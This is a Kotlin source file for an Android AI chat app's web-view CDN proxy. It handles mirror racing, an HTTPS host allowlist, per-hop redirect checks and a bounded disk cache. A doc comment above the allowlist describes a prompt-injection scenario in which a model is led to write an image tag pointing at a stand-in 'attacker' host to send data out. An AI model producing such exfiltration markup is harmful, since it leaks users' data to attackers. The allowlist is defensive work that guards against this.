package com.molagpt.app.feature.webview

import android.content.Context
import android.net.Uri
import kotlinx.coroutines.CancellableContinuation
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.Call
import okhttp3.Callback
import okhttp3.Dns
import okhttp3.HttpUrl
import okhttp3.HttpUrl.Companion.toHttpUrlOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okio.BufferedSource
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.IOException
import java.net.Inet4Address
import java.security.MessageDigest
import java.util.Collections
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

internal class CdnResponse(val body: ByteArray, val contentType: String)

/**
 * 替网页去 CDN 取库。三个理由让它经过我们而不是由浏览器直连（同桌面端 CdnProxy）：
 *  - 可达：jsDelivr、unpkg 在国内慢到不可用。每个请求同时向原地址和提供同样包路径的镜像发出，
 *    谁先完整返回用谁——海外用户什么也不损失，国内用户拿到镜像。
 *  - 缓存：成功的内容原子落盘并受真实字节预算约束，上周生成的页面离线也能打开。
 *  - 唯一关口：仅允许 HTTPS + 白名单主机，逐跳校验重定向。
 */
internal object CanvasCdn {
    /**
     * 网页能加载的主机。其余一律拒绝，图片也不例外——被注入文字诱导写出
     * `<img src="https://attacker/?q=…">` 的模型不能真把它发出去。
     */
    val allowedHosts = listOf(
        "cdn.jsdelivr.net", "fastly.jsdelivr.net", "gcore.jsdelivr.net",
        "unpkg.com", "cdnjs.cloudflare.com", "esm.sh", "cdn.tailwindcss.com",
        "registry.npmmirror.com", "cdn.npmmirror.com", "lib.baomitu.com",
        "fonts.googleapis.com", "fonts.gstatic.com",
    )

    internal const val MAX_BODY = 24L * 1024 * 1024
    internal const val CACHE_BUDGET = 64L * 1024 * 1024
    private const val MAX_TYPE_BYTES = 1024L
    private const val MAX_REDIRECTS = 5
    private const val RACE_TIMEOUT_MS = 40_000L

    private val cacheGate = Any()
    private val initialTrimmed = AtomicBoolean(false)
    private var bytesWrittenSinceTrim = 0L

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            // IPv4 优先：避免部分网络 IPv6 超时拖垮镜像竞速。
            .dns(object : Dns {
                override fun lookup(hostname: String) =
                    Dns.SYSTEM.lookup(hostname).sortedBy { if (it is Inet4Address) 0 else 1 }
            })
            .connectTimeout(8, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .callTimeout(40, TimeUnit.SECONDS)
            // 关闭自动重定向，改为逐跳校验 HTTPS 与白名单主机。
            .followRedirects(false)
            .followSslRedirects(false)
            .build()
    }

    fun isAllowed(host: String): Boolean = host.lowercase() in allowedHosts

    fun isAllowedUrl(url: HttpUrl): Boolean =
        url.isHttps &&
            isAllowed(url.host) &&
            url.port == 443 &&
            url.username.isEmpty() &&
            url.password.isEmpty()

    fun isAllowedUri(uri: Uri): Boolean {
        if (!uri.scheme.equals("https", ignoreCase = true)) return false
        val host = uri.host?.lowercase() ?: return false
        if (!isAllowed(host)) return false
        if (!uri.userInfo.isNullOrEmpty()) return false
        return uri.port == -1 || uri.port == 443
    }

    suspend fun fetch(context: Context, uri: Uri): CdnResponse? = withContext(Dispatchers.IO) {
        if (!isAllowedUri(uri)) return@withContext null
        val dir = File(context.cacheDir, "canvas-cdn")
        val key = hash(uri.toString())
        readCacheFile(dir, key, MAX_BODY)?.let { return@withContext it }

        val urls = candidates(uri).mapNotNull { it.toHttpUrlOrNull()?.takeIf(::isAllowedUrl) }
        if (urls.isEmpty()) return@withContext null
        val activeCalls = Collections.synchronizedSet(mutableSetOf<Call>())
        try {
            val winner = withTimeoutOrNull(RACE_TIMEOUT_MS) {
                coroutineScope {
                    val results = Channel<CdnResponse?>(urls.size)
                    urls.forEach { url ->
                        launch {
                            results.send(
                                fetchWithRedirects(
                                    httpClient = client,
                                    startUrl = url,
                                    urlAllowed = ::isAllowedUrl,
                                    maxBody = MAX_BODY,
                                    activeCalls = activeCalls,
                                ),
                            )
                        }
                    }
                    repeat(urls.size) {
                        val result = results.receive()
                        if (result != null) {
                            cancelAll(activeCalls)
                            return@coroutineScope result
                        }
                    }
                    null
                }
            }
            winner?.also { writeCacheFile(dir, key, it, CACHE_BUDGET) }
        } finally {
            cancelAll(activeCalls)
        }
    }

    private fun cancelAll(calls: MutableSet<Call>) {
        val snapshot = synchronized(calls) { calls.toList() }
        snapshot.forEach { runCatching { it.cancel() } }
    }

    internal suspend fun fetchWithRedirects(
        httpClient: OkHttpClient,
        startUrl: HttpUrl,
        urlAllowed: (HttpUrl) -> Boolean,
        maxBody: Long = MAX_BODY,
        activeCalls: MutableSet<Call> = Collections.synchronizedSet(mutableSetOf()),
    ): CdnResponse? {
        if (!urlAllowed(startUrl)) return null
        var currentUrl = startUrl
        repeat(MAX_REDIRECTS + 1) { hop ->
            val request = Request.Builder()
                .url(currentUrl)
                .header("User-Agent", "Mozilla/5.0 (Linux; Android) MolaGPT-Canvas/1.0")
                .build()
            val call = httpClient.newCall(request)
            activeCalls.add(call)
            try {
                call.await().use { response ->
                    val code = response.code
                    if (code in REDIRECT_CODES) {
                        if (hop >= MAX_REDIRECTS) return null
                        val location = response.header("Location")?.trim()?.takeIf { it.isNotEmpty() } ?: return null
                        val nextUrl = currentUrl.resolve(location) ?: return null
                        if (!urlAllowed(nextUrl)) return null
                        currentUrl = nextUrl
                        return@use
                    }
                    if (code != 200) return null
                    val body = response.body ?: return null
                    val declared = body.contentLength()
                    if (declared > maxBody) return null
                    val bytes = readBoundedBytes(body.source(), maxBody) ?: return null
                    val type = body.contentType()?.toString()?.takeIf { it.isNotBlank() } ?: guessType(currentUrl.toString())
                    return CdnResponse(bytes, type)
                }
            } catch (_: IOException) {
                return null
            } finally {
                activeCalls.remove(call)
            }
        }
        return null
    }

    /**
     * 严格有界读取：无论 Content-Length 是否已知，只要实际流超出 [maxBytes] 立即停止读取并返回 null。
     */
    internal fun readBoundedBytes(source: BufferedSource, maxBytes: Long): ByteArray? {
        if (maxBytes < 0L) return null
        val out = ByteArrayOutputStream()
        val buffer = ByteArray(8192)
        var total = 0L
        while (true) {
            val read = source.read(buffer, 0, buffer.size)
            if (read == -1) break
            total += read
            if (total > maxBytes) return null
            out.write(buffer, 0, read)
        }
        return out.toByteArray()
    }

    /**
     * 先原地址，再是用另一种路径提供同一文件的镜像。只做无歧义的映射：不带文件路径的裸包地址
     * 在不同 CDN 上会解析到不同的入口文件，所以不镜像。
     */
    private fun candidates(uri: Uri): List<String> {
        val out = mutableListOf(uri.toString())
        val host = uri.host?.lowercase().orEmpty()
        val path = uri.encodedPath.orEmpty()
        val query = uri.encodedQuery?.let { "?$it" }.orEmpty()
        val jsdelivr = host == "cdn.jsdelivr.net" || host == "fastly.jsdelivr.net" || host == "gcore.jsdelivr.net"

        if (jsdelivr && path.startsWith("/npm/")) {
            val npm = splitPackage(path.removePrefix("/npm/"))
            if (npm != null) {
                out += "https://registry.npmmirror.com/${npm.first}/${npm.second}/files/${npm.third}$query"
                out += "https://unpkg.com/${npm.first}@${npm.second}/${npm.third}$query"
            } else if ('+' !in path) {
                out += "https://unpkg.com/" + path.removePrefix("/npm/") + query
            }
        } else if (host == "unpkg.com") {
            splitPackage(path.trimStart('/'))?.let { (name, version, file) ->
                out += "https://registry.npmmirror.com/$name/$version/files/$file"
                out += "https://cdn.jsdelivr.net/npm/$name@$version/$file"
            }
        } else if (host == "cdnjs.cloudflare.com" && path.startsWith("/ajax/libs/")) {
            out += "https://lib.baomitu.com/" + path.removePrefix("/ajax/libs/") + query
        }
        return out
    }

    /** "echarts@5.5.1/dist/echarts.min.js" 或 "@antv/g2@5/dist/g2.min.js" → (包名, 版本, 文件)。 */
    private fun splitPackage(spec: String): Triple<String, String, String>? {
        val segments = spec.split('/')
        val nameSegments = if (spec.startsWith('@')) 2 else 1
        if (segments.size <= nameSegments) return null
        val head = segments.take(nameSegments).joinToString("/")
        val file = segments.drop(nameSegments).joinToString("/")
        if (file.isEmpty() || '+' in file || file.endsWith('/')) return null
        val at = head.lastIndexOf('@')
        val name = if (at > 0) head.substring(0, at) else head
        val version = (if (at > 0) head.substring(at + 1) else "").ifEmpty { "latest" }
        return Triple(name, version, file)
    }

    private suspend fun Call.await(): Response = suspendCancellableCoroutine { continuation: CancellableContinuation<Response> ->
        continuation.invokeOnCancellation { runCatching { cancel() } }
        enqueue(object : Callback {
            override fun onResponse(call: Call, response: Response) {
                continuation.resume(response) { response.close() }
            }
            override fun onFailure(call: Call, e: IOException) {
                if (continuation.isActive) continuation.resumeWith(Result.failure(e))
            }
        })
    }

    private fun guessType(url: String): String = when (url.substringBefore('?').substringAfterLast('.', "").lowercase()) {
        "js", "mjs", "cjs" -> "application/javascript; charset=utf-8"
        "css" -> "text/css; charset=utf-8"
        "json" -> "application/json; charset=utf-8"
        "wasm" -> "application/wasm"
        "svg" -> "image/svg+xml"
        "woff2" -> "font/woff2"
        "woff" -> "font/woff"
        "ttf" -> "font/ttf"
        "png" -> "image/png"
        else -> "application/octet-stream"
    }

    // ---- 磁盘缓存 ----

    internal fun readCacheFile(dir: File, key: String, maxBody: Long = MAX_BODY): CdnResponse? = synchronized(cacheGate) {
        runCatching {
            val body = File(dir, "$key.bin")
            val type = File(dir, "$key.type")
            if (!body.isFile || !type.isFile) return@runCatching null
            val bodyLen = body.length()
            val typeLen = type.length()
            if (bodyLen < 0L || bodyLen > maxBody || typeLen <= 0L || typeLen > MAX_TYPE_BYTES) {
                body.delete()
                type.delete()
                return@runCatching null
            }
            val bytes = readBoundedFile(body, maxBody) ?: run {
                body.delete()
                type.delete()
                return@runCatching null
            }
            val contentType = readBoundedFile(type, MAX_TYPE_BYTES)?.toString(Charsets.UTF_8)?.trim()
            if (contentType.isNullOrEmpty()) return@runCatching null
            body.setLastModified(System.currentTimeMillis())
            CdnResponse(bytes, contentType)
        }.getOrNull()
    }

    private fun readBoundedFile(file: File, maxBytes: Long): ByteArray? =
        file.inputStream().use { input ->
            val out = ByteArrayOutputStream(minOf(file.length(), maxBytes).coerceAtLeast(0L).toInt())
            val buffer = ByteArray(8192)
            var total = 0L
            while (true) {
                val read = input.read(buffer)
                if (read == -1) break
                total += read
                if (total > maxBytes) return null
                out.write(buffer, 0, read)
            }
            out.toByteArray()
        }

    internal fun writeCacheFile(dir: File, key: String, response: CdnResponse, budgetBytes: Long = CACHE_BUDGET) {
        if (response.body.size.toLong() > MAX_BODY) return
        val typeBytes = response.contentType.toByteArray(Charsets.UTF_8)
        if (typeBytes.isEmpty() || typeBytes.size.toLong() > MAX_TYPE_BYTES) return
        synchronized(cacheGate) {
            runCatching {
                dir.mkdirs()
                val bodyTarget = File(dir, "$key.bin")
                val typeTarget = File(dir, "$key.type")
                writeAtomically(dir, "$key-body-", bodyTarget, response.body)
                writeAtomically(dir, "$key-type-", typeTarget, typeBytes)
                bytesWrittenSinceTrim += response.body.size + typeBytes.size
                if (initialTrimmed.compareAndSet(false, true) ||
                    bytesWrittenSinceTrim >= (budgetBytes / 4).coerceAtLeast(1L) ||
                    response.body.size.toLong() > budgetBytes / 2
                ) {
                    trimCacheDir(dir, budgetBytes)
                    bytesWrittenSinceTrim = 0L
                }
            }
        }
    }

    private fun writeAtomically(dir: File, prefix: String, target: File, bytes: ByteArray) {
        val temp = File.createTempFile(prefix, ".tmp", dir)
        try {
            temp.writeBytes(bytes)
            if (!temp.renameTo(target)) {
                target.delete()
                if (!temp.renameTo(target)) {
                    throw IOException("Failed to commit cache file ${target.name}")
                }
            }
        } catch (error: Throwable) {
            temp.delete()
            throw error
        }
    }

    /** 按真实磁盘字节预算裁剪：统计 `.bin` 与 `.type` 总大小，并清理孤儿 `.tmp` 文件。 */
    internal fun trimCacheDir(dir: File, budgetBytes: Long = CACHE_BUDGET) {
        val all = dir.listFiles() ?: return
        all.filter { it.name.endsWith(".tmp") }.forEach { it.delete() }
        val entries = all.filter { it.isFile && it.name.endsWith(".bin") }
            .sortedByDescending { it.lastModified() }
        var total = 0L
        val keepTypes = HashSet<String>(entries.size)
        for (body in entries) {
            val typeFile = File(dir, body.name.removeSuffix(".bin") + ".type")
            val entryBytes = body.length() + if (typeFile.isFile) typeFile.length() else 0L
            if (!typeFile.isFile || total + entryBytes > budgetBytes) {
                body.delete()
                typeFile.delete()
            } else {
                total += entryBytes
                keepTypes.add(typeFile.name)
            }
        }
        // 清理没有对应 .bin 的孤儿 .type 文件。
        all.filter { it.isFile && it.name.endsWith(".type") && it.name !in keepTypes }.forEach { it.delete() }
    }

    private fun hash(value: String): String =
        MessageDigest.getInstance("SHA-256").digest(value.toByteArray()).joinToString("") { "%02x".format(it) }.take(32)

    private val REDIRECT_CODES = setOf(301, 302, 303, 307, 308)
}
